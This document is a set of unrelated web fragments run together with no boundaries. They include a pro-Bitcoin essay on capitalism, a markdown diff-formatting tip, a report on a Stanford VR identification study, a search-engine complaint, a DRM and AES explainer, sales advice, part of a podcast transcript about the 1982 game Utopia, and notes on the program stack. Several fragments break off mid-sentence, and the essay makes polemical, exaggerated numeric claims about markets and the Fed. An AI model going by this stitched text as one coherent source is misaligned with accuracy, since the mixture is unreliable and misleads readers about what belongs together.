

<blockquote><p>Innova­tion is the child of freedom and the parent of prosperity.</p></blockquote>



<p>Free market capitalism is an idea unequaled in its gener­a­tion of innova­tion. It proved itself as the most successful economic model for expanding trade, ideation, and wealth creation in the 20<sup>th</sup>-century ideolog­ical contention between American capitalism and Soviet commu­nism. Misguided by utopian promises, Soviet Russia attempted to replace the profit motive intrinsic to American capitalism with appeals to nation­al­istic faith and devotion, thereby poisoning the wellspring of learning engen­dered by trade. Under the moral­istic camou­flage of commu­nism (“from each according to their ability, to each according to their needs” was the Marxist slogan) some of the most gruesome atroc­i­ties in history were perpe­trated. Soon into the Soviet exper­i­ment, produc­tivity collapsed, and millions starved or were slaugh­tered by the state. When govern­ments play God, civiliza­tions burn in hell. Soviet Russia redis­cov­ered what wise Aristotle had warned centuries earlier:</p>



<blockquote><p>When every­body owns every­thing nobody takes care of anything.</p></blockquote>



<p>American capitalism outcom­peted Soviet commu­nism. Capitalism is a&nbsp;socioe­co­nomic system premised on the three pillars of private property rights, rule of law, and honest money. Private property rights repre­sent an exclu­sive relation­ship between individ­uals and any portion of nature they invest their time in reshaping; rights they can then exchange with similarly self-sover­eign people. Rule of law is a&nbsp;mecha­nism for nonvi­o­lently resolving private property disputes. Honest money is the private property unimpeded market processes naturally select as most tradable. Since capitalism optimizes for trade, it supports this gener­a­tive source of new ideas by incen­tivizing economic cooper­a­tion and (peaceful) compe­ti­tion. Indeed, the stability of rules is the bedrock of peace: with fixed and simple laws, market partic­i­pants are forced to play the game well to make an honest living. As Bastiat said:</p>



<blockquote><p>When goods don’t cross borders, soldiers will.</p></blockquote>



<p>In an elemental sense, trade is the water that sustains innova­tion, and its stead­fast flow a&nbsp;source of peace. Capitalism is the socioe­co­nomic “water well” built to protect this everlasting ideolog­ical wellspring of civiliza­tion — trade.</p>



<div><p><img src="https://miro.medium.com/max/2148/1*qrBwr5EEdtFLWZiSG30_ZQ.png" alt="painting of a water well"></p><figcaption>Capitalism is a&nbsp;socioe­co­nomic “water well” which protects our wellspring of ideas: trade.</figcaption></div>



<h2 id="7853">The Idea Supercomputer</h2>



<blockquote><p>Great minds discuss ideas. Average minds discuss events. Small minds discuss people.</p><cite>Eleanor Roosevelt</cite></blockquote>



<p>As the ultimate token of trade, money is an indis­pens­able tool for ideation. In trade, every­thing is valued at some ratio of every­thing else. For instance, a&nbsp;car might be worth 132 chairs, or a&nbsp;house worth 11 cars. Money is the medium through which we more easily calcu­late these exchange ratios: a&nbsp;tool that simpli­fies trade by standard­izing its inter­me­di­a­tion. Like all tools, money lets us achieve greater results with less effort, and the time-savings tools impart&nbsp;<em>is&nbsp;</em>wealth. Specif­i­cally, money lets us calcu­late, negotiate, and execute trades more quickly. Without money, a&nbsp;constant recal­cu­la­tion of count­less exchange ratios among different economic goods would be neces­sary. With money, all exchange ratios are compressed into a&nbsp;single number — the money-expressed market price. In this way, money is an accel­erant to trade and (its invis­ible twin) ideation. Standard­iza­tion to one money creates economies of scale in trade. Such econo­miza­tion is what drives the market to coalesce around a&nbsp;single money — as we saw with gold and (its former currency abstrac­tion, and now appari­tion) the US dollar:</p>



<div><p><img src="https://miro.medium.com/max/1200/1*JtTn6GgxNiUxFkb6BDIwRA.jpeg" alt="Paper is poverty Jefferson quote"></p><figcaption>America’s founding fathers knew the dangers of falsi­fying money.</figcaption></div>



<p>Money is the medium through which market partic­i­pants express their ideas, prefer­ences, and values. Pricing systems are economic telecom­mu­ni­ca­tion networks endlessly echoing and coordi­nating market action by dynam­i­cally informing everyone of everyone else’s trades. For instance, when you buy a&nbsp;car and sell a&nbsp;house, the economy responds adaptively by producing more cars and fewer houses. Even when you buy a&nbsp;public equity, you are expressing the idea its expected future cash flows are worth more than its current price, and the market­place absorbs this thesis when you execute the trade. Price signals perpet­u­ally prime incen­tives to ensure resources are allocated in accor­dance with the current aggre­gate compo­si­tion of market partic­i­pant prefer­ences. Entre­pre­neurs engaging in trade give rise to truthful pricing as they strive to buy low, sell high, and profitably serve one another. A&nbsp;true free market is a&nbsp;forum of unham­pered and volun­tary exchange where ideas compete, combine, and trans­form. Seen this way, the free market may be consid­ered the ultimate distrib­uted computing system — a&nbsp;nexus of conscious­nesses driven by human action and inter­con­nected by prices.</p>



<blockquote><div dir="ltr" lang="en"><p>A human mind can process ~120 bits/second. </p><p>The Fed’s ~20K employees can process ~18.0T bits/year. The World’s ~7.5B people can process ~6.8Q bits/year.</p><p>The free market is 3,800,000% more intel­li­gent than The Fed.</p><p>Buy <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a>, because math. <a href="https://t.co/Fp8YKP2ohW">pic.twitter.com/Fp8YKP2ohW</a></p></div>— Robert Breedlove (@Breedlove22) <a href="https://twitter.com/Breedlove22/status/1269486363444785152?ref_src=twsrc%5Etfw">June 7, 2020</a></blockquote> 



<p>Money improves the exten­si­bility of our minds. Thinking is an expres­sion of ratio­nality: the act of comparing all relevant factors to any course of action. By cogni­tively gener­ating different aspects and avatars relevant to any given situa­tion, humans create mental staging areas for future action. As with the root word of ratio­nality — <em>ratio</em> — t…</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of my favorite blogging tips is using diff formatting in GitHub flavored markdown. I use this to show what has changed in code snippets. This works for code snippets in most markdown packages and on Dev.to.</p>
<p>If I wanted to show that I was changing a function from one thing to another, I could add a snippet that looks like this!</p>
<div data-language="diff"><pre><code>function addTwoNumbers (num1, num2) {
<span><span>-</span><span>  return 1 + 2
</span></span><span><span>+</span><span>  return num1 + num2
</span></span>}</code></pre></div>
<p>First, instead of specifying the programming language, use <code>diff</code> after the backticks. Then at the beginning of any lines of code you want to show as removed, add a <code>-</code>. At the beginning of any lines of code you want to show as added, add a <code>+</code>.</p>
<p>The code would look like this:</p>
<div data-language="text"><pre><code>```diff
function addTwoNumbers (num1, num2) {
-  return 1 + 2
+  return num1 + num2
}
```</code></pre></div>
<p>I have used this in tons of my coding tutorials, such as <a href="https://welearncode.com/beginners-guide-react/" target="_blank" rel="nofollow noopener noreferrer">this</a> one. It makes it a lot easier for readers to see what is changing from snippet to snippet.</p>

            <p><a href="https://www.nature.com/articles/s41598-020-74486-y">Researchers at Stanford University</a> have shown that they can accurately identify people after only a five-minute session in a standard VR headset.</p><p>According to the German tech website, <a href="https://mixed.de/studie-vr-bewegungsdaten-verraten-identitaet/">MIXED</a>, the researchers developed a system that can identify individuals in <em>“typical VR viewing circumstances, with no specially designed identifying task.”</em></p><h3 id="how-they-did-it">How they did it</h3><p>A pool of 511 users were given a standard HTC Vive headset and wand controllers, they then watched five 20 second clips from a random set of 360-degree videos and answered questionnaires in VR. The videos were designed to see how users would react and move in a VR setting.</p><p>All of the recorded non-verbal data was plugged into a set of three machine learning algorithms. This created a profile for each of the users that measured their height, posture, head rotation speed, distance from VR content, position of controllers at rest, and how they move. The user could then be identified with 95% accuracy after only 5 minutes of non-verbal tracking data.</p><figure><img src="https://www.vrfinal.com/content/images/2020/11/stanford-vr-indentity.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/11/stanford-vr-indentity.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/11/stanford-vr-indentity.jpg 1000w, https://www.vrfinal.com/content/images/size/w1600/2020/11/stanford-vr-indentity.jpg 1600w, https://www.vrfinal.com/content/images/2020/11/stanford-vr-indentity.jpg 1770w" sizes="(min-width: 720px) 720px"></figure><h3 id="what-does-this-mean">What does this mean?</h3><p>This has huge implications for privacy. The research paper notes that <em>“In both the privacy policy of Oculus and HTC, makers of two of the most popular VR headsets in 2020, the companies are permitted to share any de-identified data. If the tracking data is shared according to rules for de-identified data, then regardless of what is promised in principle, in practice taking one’s name off a dataset accomplishes very little.”</em></p><p>So, despite your explicitly personal user data being private, the other, technically less identifiable, data could provide companies with all the information they need to accurately identify each person and their habits with a shocking degree of detail.</p><p>The research paper ends with a warning and a request, <em>“With the rise of virtual reality, body tracking data has never been more accurate and more plentiful. There are many good uses of this tracking data, but it can also be abused. This work suggests that tracking data during an everyday VR experience is an effective identifier even in large samples. We encourage the research community to explore methods to protect VR tracking data.”</em></p>

This is more pronounced on mobile where you can’t hover above a link to see where it will take you.</p> <h4 id="other-search-engines">Other search engines</h4> <p>Bing and DuckDuckGo have the same problem, though Bing has more “Website” buttons, so that’s nice, I guess?</p> <div> <div> <p><img loading="lazy" src="https://lh3.googleusercontent.com/Gyn0irJSkaKY4g-2AnijIVnShO9b1xiRWjYn3DtBOG2wVQqft_yKdeM-QwNTe2bnpZMC1jd5_0vomt8wJTybX6dvZ2ONn-A9LsJxtlfc-a-kyexMqv5xW4Nl_GeSnRs99vDduEGGcjI=w2000"></p><p><em>This is what Bing results look like</em></p> </div> </div> <h4 id="question-whose-fault-is-this">Question: Whose fault is this?</h4> <p>Actually we have to answer another question first.</p> <h4 id="question-is-what-im-describing-even-an-issue">Question: Is what I’m describing even an issue?</h4> <p>Is what Google returned actually the information people are looking for?

I think this is stupid, most businesses shouldn’t have to cater to search engines or indexers, <em>unless</em> the query was <code>burgers</code> or <code>restaurants</code>. I searched for <code>red mill burgers</code> though.</p> <p>I understand that this is a naïve position. But it leads to our current problem, because obviously the other results on this page are doing <a href="https://en.wikipedia.org/wiki/Search_engine_optimization">SEO</a> to the detriment of the actual business in question and to those looking for it.</p>  <ul> <li> <h5 id="google">Google</h5> </li> </ul> <p>Google should know what the website is and return it.</p>  <ul> <li> <h5 id="the-other-results-on-the-page">The other results on the page</h5> </li> </ul> <p>These would be the Yelps and Facebooks and TripAdvisors of the world.

<p><strong>Anyone trying to understand DRM (Digital Rights Management) will be confronted with acronyms such as AES, CDM, CENC, EME, etc. This can get very confusing for a newcomer, but understanding them is important to get a good understanding of DRM. In this article, let’s take a gentle tour of the building blocks of DRM:- EME, CDM, AES, CENC, and the use of Keys &amp; Key Servers.</strong></p>








<h2 id="simplified-architecture-of-a-drm-system"><span id="Simplified_Architecture_of_a_DRM_System"></span>Simplified Architecture of a DRM System<span></span></h2>



<p>As we saw&nbsp;<a href="https://ottverse.com/what-is-drm-digital-rights-management/">in the previous article</a>,&nbsp;<strong>DRM is a combination of encryption and business rules to control access and consumption of digital content.</strong></p>



<p>Simply put, DRM is a system that,</p>



<ul><li>provides the tools and infrastructure to enable a content provider to encrypt their content, and</li><li>build an ecosystem around the encrypted content so that the content provider can control who/what can decrypt and consume their content.</li></ul>



<p><a href="https://ottverse.com/what-is-drm-digital-rights-management/">In the previous article of the series</a>, we saw Ram and Shyam sending coded messages to each other. At the same time, Hari maintained the codebooks and decided who got to read/write the notes – remember?</p>

<p>Now, let’s take this simple system and replace it with the technology needed to secure and distribute video. What do we get?</p>



<figure><img data-attachment-id="138" data-permalink="https://ottverse.com/step-0/" data-orig-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=1396%2C818&amp;ssl=1" data-orig-size="1396,818" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="step-0" data-image-description="" data-medium-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?fit=1024%2C600&amp;ssl=1" loading="lazy" width="1024" height="600" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;is-pending-load=1#038;ssl=1" alt="aes-cenc-cdm-eme-keys" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;ssl=1 1024w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=300%2C176&amp;ssl=1 300w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=768%2C450&amp;ssl=1 768w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1200%2C703&amp;ssl=1 1200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?w=1396&amp;ssl=1 1396w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/step-0.png?resize=1024%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Let’s describe what we have here. There is a movie that we want to send to an authenticated user securely.</p>



<p>So,</p>



<ol><li>we ask a DRM company’s server for a codebook to encrypt our video,</li><li>then, we encrypt the video using that codebook</li><li>we send the movie to the user.</li><li>the user then asks the DRM company’s server for the codebook to unlock the video (decrypt it)</li><li>and then he watches the movie!</li></ol>



<p>Fantastic!</p>



<p>Is this all there is to know about DRM for video?</p>



<p>Nope! What we have here is a simple, toy-example of how to transfer movies securely using DRM. It captures the essence of DRM perfectly but wouldn’t work well in the real world.</p>



<p>In the rest of this article, let’s take each piece of this simple system, re-think it, re-design it, and see how it fits within the world of video delivery and DRM, shall we?</p>



<h2 id="step-0-lets-move-to-adaptive-bitrate-streaming"><span id="Step_0_Let%E2%80%99s_Move_to_Adaptive_Bitrate_Streaming"></span>Step 0: Let’s Move to Adaptive Bitrate Streaming<span></span></h2>



<p>Before we talk about the order, let’s modify our example to suit the ABR (<strong>A</strong>daptive&nbsp;<strong>B</strong>it<strong>R</strong>ate) model of video delivery.</p>



<p><strong>ABR Refresher:</strong>&nbsp;in ABR, a movie is encoded into different bitrate-resolution combinations&nbsp;<em>(a.k.a ladder)</em>&nbsp;and then split into&nbsp;<strong>chunks or segments</strong>. Each chunk represents a few seconds of video and it is independently decodable.</p>



<p><strong>“Packaging”</strong>&nbsp;refers to chunking or breaking up a movie into small pieces and describing it in a manifest or playlist document. When the user wants to play the movie, he needs to refer to this manifest.</p>



<p>Depending on the available bandwidth, the player requests a chunk/segment of a particular bitrate&nbsp;<em>(rendition, or rung of the ladder)</em>&nbsp;and a CDN (Content Delivery Network) responds with the requested chunk.</p>



<p>Popular methods of video delivery using ABR are MPEG DASH and HLS. For a deeper understanding, please refer to our articles on&nbsp;<a href="https://ottverse.com/what-is-ott-video-streaming/">OTT</a>&nbsp;and&nbsp;<a href="https://ottverse.com/what-is-abr-video-streaming/">ABR</a>&nbsp;video streaming.</p>



<p>Let’s change our block digram to reflect ABR video delivery.</p>

<p>The only changes here are the packaging and CDN-based delivery steps. That’s all.</p>



<p>Okay, let’s move on and start with the encryption process.</p>



<h2 id="step-1-video-encryption"><span id="Step_1_Video_Encryption"></span>Step 1: Video Encryption<span></span></h2>



<p>The whole idea of encryption is to ensure that when someone intercepts our data, they should not read it or watch it in the case of video.</p>



<p><strong>Encryption refresher:</strong>&nbsp;–&nbsp;<em>encryption is a technique used to keep data confidential and prevent unauthorized people from reading it. Encryption uses a “key” to convert input data (plaintext) into an alternate form called ciphertext. It is almost impossible to convert the ciphertext back to plaintext without the key.</em></p>



<p><em>However, practically speaking, decryption without the key is possible, and encryption algorithms are designed make reverse-engineering extremely expensive – in terms of time, money, and computing resources needed.</em></p>



<p>One of the most popular encryption techniques is the “Advanced Encryption Standard” or “AES” for short. It is also called Rijndael (after its inventor) and was established by the U.S. National Institute of Standards and Technology (NIST) in 2001 to encrypt electronic data.</p>



<p>Some important points to remember about AES:-</p>



<ul><li>It’s a&nbsp;<strong>symmetric-key algorithm</strong>: encryption and decryption are performed using the same key.</li><li>It has three variants based on the key-length: 128, 192, and 256 bits. The longer the key, the harder it is to crack.</li><li>Cracking the AES-128 without the key would require a “billion times a billion years” and a super-computer (<a href="https://www.eetimes.com/how-secure-is-aes-against-brute-force-attacks/" target="_blank" rel="noopener">source</a>).</li></ul>



<p>If you are interested in going deep into the AES standard, look at the&nbsp;<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">AES’s Wikipedia page</a>.&nbsp;<em>I am not an expert in cryptography and won’t be able to do justice to the AES.</em></p>



<p><strong>Note:</strong>&nbsp;Please remember that&nbsp;<strong>encryption is not encoding, and decryption is not decoding in the video space</strong>. For videos, encoding and decoding are words used to refer to compression and decompression, respectively. To learn more about encoding, decoding, and video codecs, please read our articles on&nbsp;<a href="https://ottverse.com/need-for-video-compression/">the need for compression</a>&nbsp;and a&nbsp;<a href="https://ottverse.com/what-is-a-video-codec/">simple introduction to video codecs</a>.</p>



<h3 id="is-aes-128-the-only-encryption-technique"><span id="Is_AES128_The_Only_Encryption_Technique"></span>Is AES-128 The Only Encryption Technique?<span></span></h3>



<p>No, it isn’t, and let’s think about the implication of this for a minute.</p>



<p>If a content provider decides to engage with three different DRM companies, and all three use different encryption techniques, then it means that the content provider needs to encrypt their videos three times, resulting in a waste of storage space and other resources.</p>



<p>That is why the CENC specification came into being – to reduce this encryption-driven fragmentation of the market and to reduce storage requirements.</p>



<p>Let’s learn about this next.</p>



<h3 id="cenc-or-common-encryption"><span id="CENC_or_Common_Encryption"></span>CENC or Common Encryption<span></span></h3>



<p><strong>Actually, before we dive into CENC, let’s step back and take a look at the state of OTT streaming protocols and CMAF in particular.</strong></p>



<p>There are primarily two protocols in use today – MPEG-DASH and HLS.&nbsp;<em>There are others such as MSS (Microsoft Smooth Streaming) and HDS, but, we’ll leave them aside for this discussion.</em></p>



<p>MPEG-DASH uses the&nbsp;<code>mp4</code>&nbsp;container format for its videos and HLS uses the MPEG-TS (<code>ts</code>) container for its files. If a content provider uses both MPEG-DASH and HLS, then they need to store a copy of their videos in both&nbsp;<code>mp4</code>&nbsp;and&nbsp;<code>ts</code>&nbsp;file formats.</p>



<p>Now, let’s add the DRM encryption problem to it. If our three hypothetical DRM providers use three different encryption standards, then a content providers needs to store&nbsp;<code>2 * 3</code>&nbsp;… six copies of each video! What a waste of storage space!!</p>



<p><strong>To combat the first problem posed by video streaming protocols, the&nbsp;<a href="https://mpeg.chiariglione.org/standards/mpeg-a/common-media-application-format" target="_blank" rel="noopener">CMAF</a>&nbsp;specification was created</strong> which said that videos can be stored in the&nbsp;<strong>fragmented mp4</strong>&nbsp;container format (<code>fmp4</code>). With support from both MPEG-DASH and HLS, you can now create only one set of videos, store it in&nbsp;<code>fmp4</code>&nbsp;format, and use a common set of files for both protocols. </p>



<p><strong>Just make sure you create two manifests (sigh!).</strong></p>



<h3><span id="How_About_Unifying_the_Encryption"></span><strong>How About Unifying the Encryption?</strong><span></span></h3>



<p>We still need to store multiple copies of each file if different DRM technologies use different encryption standards, right?</p>



<p>For this purpose, the MPEG developed the&nbsp;<a href="https://www.iso.org/standard/68042.html" target="_blank" rel="noopener">CENC or Common Encryption specification</a>, specifying that videos can be encrypted using either&nbsp;<code>cenc</code>&nbsp;(AES-128 CTR) or&nbsp;<code>cbcs</code>&nbsp;(AES-128 CBC).&nbsp;<em>CTR stands for Counter; and CBC stands for Cipher Block Chaining.</em></p>



<p>The implication of CENC is that a content provider needs to encrypt his videos only once and any decryption module can decrypt it.&nbsp;<em>Note: Exposing the encryption algorithm is not a problem as long as the keys are strongly protected.</em></p>



<p><strong>Well, CENC might sound like a magic wand for DRM-unification, but it is not.</strong></p>



<p>There are three primary DRM technologies in the market – Apple FairPlay, Google Widevine, and Microsoft PlayReady.</p>



<ul><li>Apple FairPlay supports only AES-CBC&nbsp;<code>cbcs</code>&nbsp;mode.</li><li>HLS supports only AES-CBC&nbsp;<code>cbcs</code>&nbsp;mode (irrespective of CMAF)</li><li>Widevine and PlayReady support both AES-128 CTR&nbsp;<code>cenc</code>&nbsp;or AES-128 CBC&nbsp;<code>cbcs</code>&nbsp;modes.</li><li>MPEG-DASH with CMAF supports both AES-128 CTR&nbsp;<code>cenc</code>&nbsp;or AES-128 CBC&nbsp;<code>cbcs</code>&nbsp;modes.</li><li>MPEG-DASH without CMAF supports only AES-128 CTR&nbsp;<code>cenc</code>&nbsp;mode.</li></ul>



<p>As you can see, the CMAF and CENC specs have lead to confusion and fragmentation in the streaming space. </p>



<p><strong>A possible convergence point is the universal use of CMAF and AES-CBC&nbsp;cbcs&nbsp;mode, but, how will these impact legacy devices that support only CTR or only MPEG-TS?</strong></p>



<p>That’s a discussion for another time.</p>



<h2 id="step-2-key-keyid-and-the-license-server"><span id="Step_2_Key,_KeyID,_and_the_License_Server"></span>Step 2: Key, KeyID, and the License Server<span></span></h2>



<p>By now, we have established that we will be encrypting or videos using AES-128 bit encryption. At this stage, a few questions that come up are –</p>



<ol><li>Where do we get the AES-128 Encryption Keys?</li><li>How do we associate an Encryption Key with a movie?</li><li>Where do we store the Encryption Keys?</li></ol>



<p>Let’s answer them one at a time.</p>

<p>Any content provider can generate the encryption keys manually using specialized software. Alternatively, several DRM vendors provide the necessary tools and software to generate these keys.</p>



<h3 id="how-do-we-associate-an-encryption-key-with-a-movie"><span id="How_do_we_associate_an_encryption_key_with_a_movie"></span>How do we associate an encryption key with a movie?<span></span></h3>



<p>Let’s understand the “why” first. When you go to a hotel, you ask the receptionist for the keys to a particular room by mentioning the room number – right? You’re providing the association here between a key and a room by telling her the room number.</p>



<p>Similarly, when we encrypt a movie with a particular key, we need to create that association and provide that to the DRM license server&nbsp;<em>(our receptionist, if you will)</em>.</p>



<p>In DRM, a “<strong>KeyID</strong>” provides the association between an encryption key and a movie. It is a&nbsp;<strong>unique</strong>&nbsp;string of characters generated at the time of creating an encryption key for a particular movie.</p>

<p><strong>The Encryption Key and the KeyID are stored in a secure server (Key Store) that works alongside a DRM license server</strong>.</p>

<p>Currently, you might not be actively selling (as in approaching leads). Or the product sells itself right now (people get in touch with you and buy).&nbsp;</p>



<p>You feel weird about cold-calling, approaching strangers about your offerings. It’s a valid concern.&nbsp;</p>



<p>When you look at your current customer base and revenues: Can you predict when you make a sale? Can you be confident if somebody will follow through with the purchase?&nbsp;</p>



<p>If you don’t have Sales People on staff, this is a challenge. Why should you care, though?</p>



<p>For starters, you might need to plan revenue for the next few months, to hire a new employee, or invest in that new project you’ve been anxious to kick off.</p>



<p>Whatever the motivation is in the end, you need to predict incoming revenue. And for that, you need to sell. As always, there are multiple approaches to this.</p>



<p>As a starting point, you can start to work off all inbound sales inquiries. Your Advantage: No cold outreach to anyone. You focus solely on incoming requests and work them off.&nbsp;</p>



<p>You increase your odds of closing deals with a well-defined sales process. A sales process helps you confidently walk a prospect through each step and increase the chance to become a paying customer.</p>



<p>It still might not allow you to increase revenue as you need it, but you can more effectively predict incoming revenue. This circumstance is already worth a lot because it provides you with a lot more financial stability.&nbsp;</p>



<p>Another circumstance should also make this process more comfortable for you: You are already selling to those who gave you permission. You are allowed to sell. These prospects got in touch with you because they need something from you. Now it’s on you to professionally handle the request and walk them through the process.</p>



<p>With this approach, you’re slowly building Sales Competency in your organization for a more stable revenue foundation.</p>

<h3>(Partial) Transcript</h3>
<p><strong><em>[Most episode transcripts/scripts are reserved for my Patreon supporters (at least for the time being), but I like to give you at least a taster here — or in this case, the first half of the episode.]</em></strong></p><p><span>Welcome to the Life and Times of Video Games, a documentary audio series about video games and the video game industry, as they were in the past and how they've come to be the way they are today. I'm Richard Moss, and this is episode 29, Utopia, and the teacher who made a game of its impossibility.<p>We'll get going in just a moment.</p><p>*pre-roll ad spot*</p><p>***</p><p>Life is chaos. Disorder. Imperfection. Disharmony. And yet we cannot resist the temptation to imagine a perfect world, if only one could exist, and to ponder how we might attain it.</p><p>We call this utopia, a term plucked from the writings of Sir Thomas More, an Englishman who lived in the late-15th and early-16th-century. He was a statesman, lawyer, and philosopher, but today we know him best for a literary work of his called Utopia, a satirical account, told by a fictional character to More himself, of visiting a perfect island society. A place called Utopia, a place that, of course, was flawed in myriad ways, doomed to failure, and frankly much less perfect than our enthusiastic traveller would have you believe, all for reasons left to the reader to identify.</p><p>It was hardly the first time that somebody had imagined — or even satirised — an ideal society, but it captured the imagination in such a way that we named the concept after this fictional place. Utopia, a word meaning "nowhere", or "no place", thus now also means "the perfect place".</p><p>And it has occupied the minds of game designers just as completely over the five decades we've had this digital medium as it had architects, writers, philosophers, painters, and poets for millennia before that.</p><p>But not necessarily for the same reasons — for you see game designers, in the same vein, it seems, as Sir Thomas More, tend to think in systems — not ideals. They look at the interaction of these systems, and examine how the world works. They play with systems, and they create models and simulations with them — so that we may play with them too.</p><p>Thus emerged Utopia, the video game, an early 1982 release for Mattel's Intellivision home video game console. It was a bestseller, but more importantly it was a critical darling that proved so influential it would foreshadow the creation of two, maybe three major genres as well as one of the most influential games of all time.</p><p>But I'm getting ahead of myself. Before I tell you about Utopia's legacy, I want to share the story of its creation. And in order to do that, I need to lay out some background context.</p><p>***</p><p>So let's go back to the mid-1960s, probably around 1964, 17-18 years before Utopia's release. There's this kid, Don Daglow — he's the one who would go on to make Utopia, but at this point he's in sixth grade. He's been hearing for as long as he can remember, from his anthropologist-turned-accountant father, that one day computers are going to change the world. And now his teacher has taken him and a couple of his classmates on a field trip to San Francisco to see some computers up close.</p><p>This is at the time when computers are room-sized monstrosities operated in freezing cold conditions, and when they mainly used punch cards for input. And the operators of one such computer decided to show Don and his classmates a quirk in the design of the system that caused it to emit various electromagnetic frequencies as it operates — frequencies that could in turn be picked up by a portable radio to play sound.</p><iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/EPk8MVEmiTI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p>Here's Don:</p></span></p><blockquote>Don Daglow: And normally of course that was just kind of this little cacophony of random tunes, but some smart character in their team somewhere, or somewhere where it had been shared, had created a deck that would play a song. And so they'd put that deck in the card reader and play it through. And here's the card reader playing the song. I don't remember what it was. But we all thought that that was really, really cool.</blockquote>
<p><span>(The music in the background just now was not my interpretation but rather an actual recording of one such song, by the way, that some Computer History Museum restorers made a decade ago.)<p>And so with an experience like that to think back on, you can probably understand why this next moment went down the way it did: flash forward to 1971. Don's finished high school and he's in his second year of a liberal arts degree at Pomona College in Southern California, which as it happens had just received a grant from the Sloan Foundation to put two computer terminals in a dormitory for all students to access.</p></span><span><em><br></em></span></p><blockquote><p>Don Daglow: So one day in 1971, you know, some things you remember — when I'm telling this story, I always go, you know, some things you remember in infinite detail. And I remember this day in _great_ detail because it was such a change in my life at that moment. But I was walking down the hallway of the dormitory, just after I walked in, and I hear this clickety click, click, clack, clack, clickety click sound.</p>
<p>And I'm thinking, 'what the heck is that?' And it's coming from this little room with the open door. And this is the dorm I lived in. Just pure luck that that's where the terminal got put. You know, with so many of these things, luck plays such a huge role. And I walked in and here are these two terminals and there's a student and I said, wow, what's this? And she explained what was going on and she said, would you like to try playing a game on the computer?</p>
<p>And so I sat down at the keyboard and I think the first one that she brought up was a horse racing game where you picked a number between one and eight. And then you hit return and then you didn't do anything and just said, okay, a quarter of the way, number three is ahead. Then number two, then number eight. You would just get the order. And so of course it was a one through eight random number guessing game, a 1D8, but it had a narrative and told a story.</p>
<p>And so after I tried a couple of — Oh, and then she said, Oh, well would you like to have a conversation with a psychologist? And she brought up Eliza and I played with Eliza and I went, Oh dear, Oh this is so cool. Cause I was a playwriting major. I thought that my — you know, my grand dream was to, you know, change American theatrical literature as a playwright. You know, all the great dreams you had as a college kid. And I knew that the odds of that were one in 10 million, but it was still kind of my dream and I was willing to work hard at it.</p>
And I thought, what the heck, I'm a good writer. I'll see what happens.</blockquote><p><span><br>He realised that these games he was playing were like interactive theatre. He could write that. And so he did.<br>Don learnt how to write code in BASIC, which at the time was the standard language for getting into computer programming, and he started making programs. And he continued making programs, all through the three remaining years of his undergraduate studies as well as his two years of grad school.<br>Mostly he made games — like a Star Trek game that cast you as captain of the Enterprise and printed out a TV-style script as you made decisions. But there were all sorts of games, some of which I'll cover in more detail in a future episode, and a few of which gained a fair degree of notoriety, but let's keep the story going:</span><span><em><br></em></span></p><blockquote><p>Don Daglow: I was training as a teacher because I knew that playwrights and writers starved. And so I was trained to be a teacher, which I enjoyed doing. And so that meant for — until I got my master's, for almost two more years, I got to keep my computer access. And three days after I got my master's degree, they hired me as an instructor in the teacher training program in the department of education.</p>
<p>And I taught there for four years, which gave me four more years of access in the computer system. So I had nine years in which I could be writing on a mainframe. So basically …</p></blockquote></div></div>

<h2>00:00:00 Intro</h2>

<li>The stack pretty much always TLB hits!</li>
</ul>
<h2>00:00:59 Disclaimer</h2>
<ul>
<li>We're lifelong learners, only know so much!</li>
<li>Will put errata up on <a href="https://tlbh.it/">the TLB Hit website</a></li>
<li><a href="https://en.wikipedia.org/wiki/Covert_channel">"Sidechannels"</a> via Twitter</li>
</ul>
<h2>00:01:42 What's the stack?</h2>
<ul>
<li>Episode is named <code>mov fp sp</code></li>
<li><code>mov fp sp</code> in the prologue of functions</li>
<li>Epilogue has "reverse" <code>mov sp fp</code></li>
<li>Instructions that manipulate <em>the stack</em>!</li>
<li>Compiler spills values that registers can't hold onto the stack</li>
<li>Functions do it a lot -- have their own [local] state, call functions that
have their own state</li>
<li>Because subroutines can recurse without bounds would need unbounded number of
registers</li>
<li>Often different kinds of registers: arithmetic value registers, floating
point registers</li>
<li>Registers contain fairly arbitrary "stuff": pointers to data, pointers to
code, return addresses, etc.</li>
<li>Stack is <em>usually</em> contiguous and allocated on a per-thread basis</li>
<li>Idea of "GPRs": general purpose registers, though some machines have
